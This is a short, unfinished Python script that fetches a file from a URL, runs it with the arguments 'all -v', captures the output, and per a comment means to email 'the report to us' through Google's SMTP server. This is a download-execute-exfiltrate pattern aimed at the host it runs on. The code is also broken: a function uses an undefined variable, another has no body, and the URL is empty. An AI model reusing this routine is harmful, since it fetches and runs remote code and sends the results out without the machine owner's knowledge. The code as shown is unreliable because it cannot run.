#!/usr/bin/env python
import subprocess
import smtplib
import requests

def get_payload():
        get_request = requests.get(url)
        print(get_request.content)
        name = url.split("/")[-1]
        with open(name, "wb") as payload:
            payload.write(get_request.content)

def mail_it():
    #mail the report to us using google smtp server

URL= ""
get_payload(URL)
file_name = URL.split("/")[-1]
process = subprocess.Popen([file_name, 'all', '-v'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
result, error = process.communicate()
try:
    message = result.decode('latin-1').encode("utf-8")
except:
    message = str(result)

